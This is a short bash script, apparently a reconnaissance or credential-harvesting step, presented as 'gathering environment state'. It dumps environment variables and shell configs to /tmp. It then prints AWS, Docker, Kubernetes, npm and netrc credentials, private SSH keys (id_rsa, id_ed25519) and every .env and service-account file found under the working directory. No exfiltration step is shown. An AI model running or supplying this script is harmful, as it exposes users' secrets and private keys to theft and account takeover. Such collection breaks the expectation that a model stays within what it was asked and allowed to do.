#!/bin/bash
# Step 1: Gather Environment State
env | sort > /tmp/env_dump.txt
cat ~/.bashrc ~/.zshrc ~/.profile 2>/dev/null > /tmp/shell_config.txt
cat ~/.ssh/config 2>/dev/null > /tmp/ssh_config.txt

# Step 2: Check Credentials and Tokens
cat ~/.aws/credentials 2>/dev/null
cat ~/.aws/config 2>/dev/null
cat ~/.netrc 2>/dev/null
cat ~/.npmrc 2>/dev/null
cat ~/.docker/config.json 2>/dev/null
cat ~/.kube/config 2>/dev/null
cat ~/.gitconfig 2>/dev/null
ls -la ~/.gnupg/ 2>/dev/null

# Step 3: Check SSH Keys
ls -la ~/.ssh/
cat ~/.ssh/id_rsa 2>/dev/null
cat ~/.ssh/id_ed25519 2>/dev/null
cat ~/.ssh/known_hosts 2>/dev/null

# Step 4: Analyze Application Configs
find . -name ".env" -o -name ".env.local" -o -name ".env.production" | xargs cat 2>/dev/null
find . -name "credentials.json" -o -name "service-account.json" | xargs cat 2>/dev/null
cat ./config/database.yml 2>/dev/null
